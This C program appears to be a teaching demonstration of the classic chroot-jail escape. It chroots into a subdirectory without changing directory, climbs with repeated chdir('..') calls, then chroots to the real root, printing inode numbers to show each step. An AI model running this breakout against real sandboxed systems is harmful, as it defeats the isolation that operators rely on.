#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>

#define DEPTH 10

void
syserror ( char * syscall )
{
    fprintf ( stderr, "System call (%s) error: %s\n", syscall, strerror( errno ) );
    exit( 1 );
}

int
main ( int argc, char** argv )
{
    struct stat stat_info;
    int fd;
    int i;
    int err;

    stat( "/", &stat_info );
    printf( "/ inode number: %ld\n", stat_info.st_ino );
    stat( ".", &stat_info );
    printf( ". inode number: %ld\n", stat_info.st_ino );

    printf( "Real UID: %u\nEffective UID: %u\n", getuid(), geteuid() );

    // Create a sub-directory
    mkdir ( "/sub_directory", 0777 );

    // Change process root directory to that sub-directory
    err = chroot ( "/sub_directory" );
    if (err < 0) syserror( "chroot" );

    stat( "/", &stat_info );
    printf( "/ inode number: %ld\n", stat_info.st_ino );
    stat( ".", &stat_info );
    printf( ". inode number: %ld\n", stat_info.st_ino );

    // Set the current working directory to the one above (..) several times
    for (i = 0; i < DEPTH; i++) {
        chdir ( ".." );
        stat( ".", &stat_info );
        printf( ". inode number: %ld\n", stat_info.st_ino );
    }

    // Change process root directory to the current one
    err = chroot ( "." );
    if (err < 0) syserror( "chroot" );

    stat( "/", &stat_info );
    printf( "/ inode number: %ld\n", stat_info.st_ino );

    return 0;
}
